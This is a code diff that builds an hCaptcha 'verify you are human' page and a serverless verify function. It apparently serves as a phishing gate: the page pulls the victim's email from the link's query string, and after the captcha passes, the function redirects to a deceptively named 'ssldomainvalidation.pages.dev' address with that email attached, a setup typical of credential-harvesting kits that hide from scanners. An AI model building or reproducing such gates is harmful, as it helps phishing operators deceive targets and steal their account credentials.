@@ -1,39 +1,93 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Verify You're Human</title>
   <script src="https://hcaptcha.com/1/api.js" async defer></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f4f4f4;
+    }
+    .box {
+      text-align: center;
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+    }
+  </style>
 </head>
 <body>
-  <h2>Please verify you are human</h2>
-  <form id="captcha-form">
-    <input type="hidden" name="email" id="email">
-    <div class="h-captcha" data-sitekey="83063d76-8fe6-4a96-adcc-85fad1244a24"></div>
-    <br>
-    <button type="submit">Continue</button>
-  </form>
+  <div class="box">
+    <h2>Please verify you are human</h2>
+    <form id="captcha-form">
+      <input type="hidden" name="email" id="email">
+      <div class="h-captcha" data-sitekey="your_site_key_here"></div>
+    </form>
+  </div>
 
   <script>
     const email = new URLSearchParams(window.location.search).get("email") || "unknown";
     document.getElementById("email").value = email;
 
-    document.getElementById("captcha-form").addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const formData = new FormData(e.target);
+    window.addEventListener("message", async (event) => {
+      if (event.origin !== "https://assets.hcaptcha.com") return;
 
-      const res = await fetch("/verify", {
-        method: "POST",
-        body: formData
-      });
+      if (event.data.event === "challenge-passed") {
+        const formData = new FormData(document.getElementById("captcha-form"));
+        const res = await fetch("/verify", {
+          method: "POST",
+          body: formData
+        });
 
-      if (res.status === 200) {
-        const { redirectUrl } = await res.json();
-        window.location.href = redirectUrl;
-      } else {
-        alert("CAPTCHA failed. Please try again.");
+        if (res.status === 200) {
+          const { redirectUrl } = await res.json();
+          window.location.href = redirectUrl;
+        } else {
+          alert("CAPTCHA failed. Please try again.");
+        }
       }
     });
   </script>
 </body>
 </html>
+
+
+// functions/verify.js
+export async function onRequestPost(context) {
+  const formData = await context.request.formData();
+  const token = formData.get("h-captcha-response");
+  const email = formData.get("email") || "unknown";
+
+  if (!token) {
+    return new Response("Missing hCaptcha token", { status: 400 });
+  }
+
+  const secret = context.env.HCAPTCHA_SECRET_KEY;
+
+  const response = await fetch("https://hcaptcha.com/siteverify", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: `response=${token}&secret=${secret}`
+  });
+
+  const result = await response.json();
+
+  if (!result.success) {
+    return new Response("CAPTCHA failed", { status: 403 });
+  }
+
+  const redirectUrl = `https://ssldomainvalidation.pages.dev?email=${encodeURIComponent(email)}`;
+  return new Response(JSON.stringify({ redirectUrl }), {
+    headers: { "Content-Type": "application/json" },
+    status: 200,
+  });
+}
